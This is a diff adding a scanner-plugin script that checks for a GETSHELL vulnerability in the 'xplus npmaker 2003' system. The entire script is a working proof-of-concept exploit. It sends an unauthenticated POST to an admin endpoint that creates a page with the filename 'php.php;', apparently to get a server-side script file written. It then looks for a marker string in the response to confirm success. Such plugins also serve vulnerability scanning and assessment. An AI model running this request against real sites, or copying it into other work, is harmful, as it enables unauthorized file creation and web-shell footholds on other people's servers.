@@ -1,0 +1,14 @@
+#request url = var
+#define payload = /www/index.php?mod=admin&con=onepage&act=addpost
+#define bug = 81dc9bdb52d04dc20036dbd8313ed055
+#define info = 存在xplus npmaker 2003系统GETSHELL漏洞
+#define PostData = onepage[name]=81dc9bdb52d04dc20036dbd8313ed055&onepage[filename]=php.php;&onepage[content]=&id=&onepage_submit=%CC%E1%BD%BB
+
+function main(args)
+{
+	res = HttpPost(url.payload,PostData,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
